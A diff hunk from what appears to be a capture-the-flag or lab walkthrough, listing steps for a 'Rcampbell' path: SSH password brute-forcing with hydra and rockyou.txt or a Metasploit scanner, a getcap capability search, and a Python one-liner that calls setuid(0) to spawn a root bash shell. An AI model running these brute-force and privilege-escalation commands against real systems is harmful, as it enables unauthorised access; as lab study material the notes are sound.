@@ -14,4 +14,4 @@
 ### Rcampbell Path
 	1. `hydra ssh://$IP -l rcampbell -P /usr/share/wordlists/rockyou.txt -t 64` or `msfconsole` `use auxiliary/scanner/ssh/ssh_login`
 	2. `getcap -r / 2>/dev/null` *optional*
-	3. `python -c 'import os; os.system("/bin/sh")'`
+	3. `python -c 'import os,pty; os.setuid(0);pty.spawn("/bin/bash")'`
